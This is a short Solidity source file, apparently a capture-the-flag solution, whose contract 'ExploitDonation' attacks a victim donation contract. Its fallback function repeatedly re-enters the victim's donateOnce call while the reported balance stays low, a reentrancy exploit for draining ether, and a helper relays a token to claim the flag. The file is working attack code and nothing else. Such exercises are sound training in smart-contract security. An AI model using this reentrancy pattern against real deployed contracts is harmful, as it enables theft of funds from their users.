// SPDX-License-Identifier: MIT

pragma solidity >=0.8.7;    

interface VictimContract { 
    function newAccount()  external payable;

    function donateOnce()  external;

    function getBalance() external view returns (uint256 donatorBalance) ;
    function getFlag(bytes32 _token) external ;
}

contract ExploitDonation { 
    address public victimAddress;
    VictimContract victimContract; 

    constructor(address _victimAddress){
            victimAddress=_victimAddress;
            victimContract=VictimContract(victimAddress);
    }

    function startAttack() public payable {
        victimContract.newAccount{value:msg.value}();
        victimContract.donateOnce();

    }

    fallback()external payable {
        uint my_balance= victimContract.getBalance();
        if (my_balance<=20)
            victimContract.donateOnce();

    }

 function getBalance() public view returns (uint256) {
        return victimContract.getBalance();
    }

    function getFlag(bytes32 _token) public {

        victimContract.getFlag(_token);
    }
}
